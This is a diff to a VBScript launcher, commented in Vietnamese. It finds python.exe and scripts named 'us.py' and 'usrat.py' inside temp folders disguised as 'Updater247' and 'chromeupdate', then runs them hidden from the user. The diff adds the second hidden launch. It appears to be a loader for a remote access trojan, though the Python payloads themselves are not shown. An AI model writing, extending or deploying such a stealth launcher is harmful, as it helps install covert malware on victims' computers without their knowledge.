@@ -1,3 +1,4 @@
+
 Dim shell, fso, tempFolder
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
@@ -24,12 +25,22 @@ Function FindFile(startFolder, fileName)
     End If
 End Function
 
+' =============================
+' Tìm python.exe và file py trong Updater247
+pyExe1 = FindFile(tempFolder & "Updater247", "python.exe")
+pyScript1 = FindFile(tempFolder & "Updater247", "us.py")
 
 ' Tìm python.exe và file py trong chromeupdate 
 pyExe2 = FindFile(tempFolder & "chromeupdate", "python.exe")
 pyScript2 = FindFile(tempFolder & "chromeupdate", "usrat.py")
 
 ' =============================
+' Chạy script 1 nếu tìm thấy
+If pyExe1 <> "" And pyScript1 <> "" Then
+    shell.Run """" & pyExe1 & """ """ & pyScript1 & """", 0, False
+Else
+    MsgBox "Không tìm thấy"
+End If
 
 ' Chạy script 2 nếu tìm thấy
 If pyExe2 <> "" And pyScript2 <> "" Then
